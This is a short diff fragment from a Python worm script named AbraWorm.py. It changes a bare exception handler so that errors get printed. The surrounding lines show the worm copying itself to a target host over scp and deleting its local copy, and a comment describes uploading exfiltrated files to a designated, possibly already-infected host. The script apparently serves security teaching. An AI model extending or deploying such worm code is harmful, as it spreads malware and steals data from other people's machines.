@@ -151,7 +151,8 @@ while True:
                     print("\n\nAbraWorm.py deposited at the target host\n")
                     scpcon.close()
                     os.remove('AbraWorm.py')
-                except:
+                except Exception as e:
+                    print("Exception: %s" % str(e))
                     continue
                 # Now upload the exfiltrated files to a specially designated host,
                 # which can be a previously infected host.  The worm will only 
